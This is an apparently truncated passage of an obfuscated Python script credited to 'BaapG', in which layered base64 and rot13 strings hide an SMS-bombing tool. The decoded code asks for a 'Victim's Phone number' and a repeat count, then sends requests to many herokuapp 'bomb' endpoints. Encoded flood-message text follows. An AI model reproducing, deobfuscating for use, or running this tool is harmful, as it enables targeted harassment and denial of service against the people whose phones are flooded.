# Python code Encrypted By BaapG
# Thanks Hiru

import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKdHJ5OgoJaW1wb3J0IGNvbG9yYW1hCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOgoJcHJpbnQoImNvbG9yYW1hIGlzIG5vdCBJbnN0YWxsZWQiKQoJb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCBjb2xvcmFtYSIpCnRyeToKCWltcG9ydCByZXF1ZXN0cwpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoKCXByaW50KCJSZXF1ZXN0cyBpcyBub3QgSW5zdGFsbGVkIikKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQpkZWYgY2hlY2tfaW50cigpOgogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9tb3RoZXJmdWNraW5nd2Vic2l0ZS5jb20iKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwcmludCgiQWJlIENodXRpeWEgSW50ZXJuZXQgT24gS2FyLiBJbnRlcm5ldCBFcnJvciIpCiAgICAgICAgc3lzLmV4aXQoMikKZnJvbSBjb2xvcmFtYSBpbXBvcnQgIEZvcmUsU3R5bGUKUiA9IEZvcmUuUkVECkIgPSBGb3JlLkJMVUUKRyA9IEZvcmUuR1JFRU4KQyA9IEZvcmUuQ1lBTgpZICA9IEZvcmUuWUVMTE9XCk0gPSBGb3JlLk1BR0VOVEEKVyA9IEZvcmUuV0hJVEUKUkVEPSIkKHByaW50ZiAnXGVbMzFtJykiCkdSRUVOPSIkKHByaW50ZiAnXGVbMzJtJykiCk9SQU5HRT0iJChwcmludGYgJ1xlWzMzbScpIgpCTFVFPSIkKHByaW50ZiAnXGVbMzRtJykiCk1BR0VOVEE9IiQocHJpbnRmICdcZVszNW0nKSIKQ1lBTj0iJChwcmludGYgJ1xlWzM2bScpIgpXSElURT0iJChwcmludGYgJ1xlWzM3bScpIgpCTEFDSz0iJChwcmludGYgJ1xlWzMwbScpIgpsaWMgPSAiIiIKIyAgQ29weXJpZ2h0IDIwMjEgVER5bmFtb3MgPHRkeW5hbW9zQGxpbnV4PgojICAKIyAgVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKIyAgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkKIyAgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyIHZlcnNpb24gMiBvZiB0aGUgTGljZW5zZSwgb3IKIyAgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KIyAgCiMgIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAojICBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgojICBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlCiMgIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCiMgIAojICBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZQojICBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZQojICBGb3VuZGF0aW9uLCBJbmMuLCA1MSBGcmFua2xpbiBTdHJlZXQsIEZpZnRoIEZsb29yLCBCb3N0b24sawojICBNQSAwMjExMC0xMzAxLCBVU0EuCiMgaWYgWW91IEhhdmUgQW55IFByb2JsZW0gQ29udGFjdCBNZSBPbiBJbnN0YSBAa3Jpc2hfbmFfMjU2OAojIEdoYXppcHVyIFVwIEluZGlhIAojIE15IEluc3RhIEBLcmlzaF9uYV8yNTY4CiIiIgoKbG9nbyA9IGYiIiIKe1J94pWt4pSB4pSB4pWu4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWt4pSB4pSB4pSB4pWuIOKVreKUgeKUgeKUgeKVruKVreKVruKVseKVreKVruKVseKVseKVseKVseKVseKVseKVreKVrgp7Un3ilIPila3ila7ilIPilbHilbHilbHilbHilbHilbHilbHilbHilbHilIPila3ilIHila7ilIMg4pSD4pWt4pSB4pWu4pSj4pWv4pWw4pSz4pWv4pWw4pWu4pWx4pWx4pWx4pWx4pWx4pSD4pSDCntXfeKUg+KVsOKVr+KVsOKUs+KUgeKUgeKUs+KUgeKUgeKUs+KUgeKUgeKUq+KUg+KVseKVsOKVryDilIPilIPilbHilIPilKPila7ila3ilLvila7ila3ilYvilIHilIHilLPilIHilIHilKvilIPila3ila4Ke1d94pSD4pWt4pSB4pWu4pSD4pWt4pWu4pSD4pWt4pWu4pSD4pWt4pWu4pSD4pSD4pWt4pSB4pWuIOKUg+KVsOKUgeKVr+KUg+KUg+KUg+KVseKUg+KUg+KUg+KVreKVruKUg+KVreKUgeKUq+KVsOKVr+KVrwp7R33ilIPilbDilIHila/ilIPila3ila7ilIPila3ila7ilIPilbDila/ilIPilbDilLvilIHilIMg4pSD4pWt4pSB4pWu4pSD4pSD4pWw4pWu4pSD4pWw4pSr4pWt4pWu4pSD4pWw4pSB4pSr4pWt4pWu4pWuCntHfeKVsOKUgeKUgeKUgeKUu+KVr+KVsOKUu+KVr+KVsOKUq+KVreKUgeKUu+KUgeKUgeKUgeKVryDilbDila/ilbHilbDila/ilbDilIHila/ilbDilIHilLvila/ilbDilLvilIHilIHilLvila/ilbDila8K4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pSD4pSDIHtDfUF1dGhvciA6IHtZfUJhYXBHIEtyaXNobmEge1l9UmFqcHV0CuKVseKVseKVseKVseKVseKVseKVseKVseKVseKVseKVsOKVryB7Q31Db2RlciAgOiB7WX1BbnNoIERhZHdhbAogIiIiCm9zLnN5c3RlbSgnY2xlYXInKQpkZWYgc21zKCk6CgljaGVja19pbnRyKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQoU3R5bGUuQlJJR0hUK2xvZ28pCglwcmludChHKQoJbnVtYmVyPWlucHV0KGYie0d9W3tXfSt7R31dIEVudGVyIHRoZSBWaWN0aW0ncyBQaG9uZSBudW1iZXIgXG5cbntXfS0tLS0te1J9IyB7Q30iKQoJcHJpbnQoKQoJY3Jhc2g9aW50KGlucHV0KGYne0d9W3tXfSt7R31dIEhvdyBNYW55IHRpbWVzIGRvIHlvdSB3YW50IHRvIFNlbmQgW3tXfTF7R31dIEJldHRlclxuXG57Un0+Pj57R30gJykpCglsaW5rNiA9IGYiaHR0cHM6Ly9uZXd4eGxyODUuaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJbGluazcgPSBmImh0dHBzOi8vYmFhcGctYXR0YWNrLmhlcm9rdWFwcC5jb20vYm9tYi97bnVtYmVyfSIKCWxpbms4ID0gZiJodHRwczovL3J1YmEteDEyLmhlcm9rdWFwcC5jb20vYm9tYj9udW1iZXI9e251bWJlcn0iCglsaW5rOSA9IGYiaHR0cHM6Ly9iYWFwZy1hdHRhY2suaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJbGluazEwID0gZiJodHRwczovL3J1YmEteDEyLmhlcm9rdWFwcC5jb20vYm9tYj9udW1iZXI9e251bWJlcn0iCglsaW5rMTggPSBmImh0dHA6Ly9iYWFwZy1hdHRhY2syLmV6eXJvLmNvbS9CYWFwRy5waHA/bnVtPXtudW1iZXJ9JnN1Ym1pdD1CT09NJTIxJTIxIgoJbGluazE3ID0gZiJodHRwczovL3J1YmEteDExLmhlcm9rdWFwcC5jb20vYm9tYj9udW1iZXI9e251bWJlcn0iCglsaW5rMTYgPSBmImh0dHBzOi8vYmFhcGctYXR0YWNrLmhlcm9rdWFwcC5jb20vYm9tYi97bnVtYmVyfSIKCWxpbmsxNSA9IGYiaHR0cHM6Ly9iYWFwZy1hdHRhY2suaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJbGluazIwID0gZiJodHRwczovL25ld3h4bHI4NS5oZXJva3VhcHAuY29tL2JvbWIve251bWJlcn0iCglsaW5rMTEgPSBmImh0dHBzOi8vYmFhcGcteDEwLmhlcm9rdWFwcC5jb20vYm9tYi97bnVtYmVyfSIKCWxpbmsxMiA9IGYiaHR0cHM6Ly9ydWJhLXgxMi5oZXJva3VhcHAuY29tL2JvbWI/bnVtYmVyPXtudW1iZXJ9IgoJbGluazggPSBmImh0dHBzOi8vYmFhcGctd2hhdHNhcHAuaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJbGluayA9IGYiaHR0cHM6Ly9jdXN0b21zbXMudGsvQmFhcEcucGhwP251bT17bnVtYmVyfSZzdWJtaXQ9U0VORCUyMSIKCWxpbmsxID0gZiJodHRwczovL25ld3h4bHI4NS5oZXJva3VhcHAuY29tL2JvbWIve251bWJlcn0iCglsaW5rMiA9IGYiaHR0cH'
love = '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OmBv8iq2RhoJHir251oJWypa0iC3EyrUD9DzSupRpyZwOXLJxyZwOVnJ5xWHLjWGyTWGxlWHRmWGVjE2uurzyjqKVyZwOIpPHlZRyhMTyuWHLjWGyTWGxlWHRmWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGVjWHHlWGtjWGuOWGOOWHLjWGyTWGx4WGt4Ez9foT93WGVjGJHyZwOCovHlZRyhp3EuWGVjWGDjn3Wcp2usozSsZwH2BPITZPH5EvIOAPIOZlHjDFITZPH5EvH5APIOAHuOJFHlZREIERRyZwOBFHgOFPHlZSyIFlHlZRSKG0gKG0fyZwNyEwNyBHLyBGtyBQtyZRRdnUE0pUZyZ0RyZxLyZxM5o3I0qF5vMFHlEwEGYJxjAmtgJIySXvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXyMWHyESJPHlZRWIDIEOGvHlZR1FWGVjIxyFIIZyZwOPIHgOGvHlZRgOGRIBElIQZvIPZvbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5'
god = 'OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEElMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEElRjAlOUYlOTMlOENCWSVFMiU4MCVBMk1SJUUyJTgwJUEyVlVSVVMtU1BNJUYwJTlGJTkyJUEzJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKi'
